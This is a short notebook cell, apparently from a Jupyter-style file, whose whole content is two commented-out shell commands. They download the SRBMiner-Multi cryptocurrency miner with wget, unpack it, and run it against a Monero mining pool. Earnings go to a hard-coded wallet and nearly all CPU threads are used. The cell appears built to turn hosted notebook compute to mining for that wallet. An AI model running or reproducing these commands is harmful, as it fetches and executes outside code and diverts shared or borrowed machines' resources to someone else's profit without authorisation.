# %%
# !wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.3/SRBMiner-Multi-0-9-3-Linux.tar.xz && tar -xf SRBMiner-Multi-0-9-3-Linux.tar.xz 
# !cd SRBMiner-Multi-0-9-3 && ./SRBMiner-MULTI --disable-gpu --algorithm randomx --pool pool.minexmr.com:4444 --wallet 87BdBmShAdjX5F2gPtfQzdGEVb8KMtghPCPSugoyK8rHR2Ut3LDYVgK4viGaWgCfFCWKyZGtYNmtzQxjUj1VSFAEUuFUBrH --password x --cpu-threads $(nproc --ignore 1)
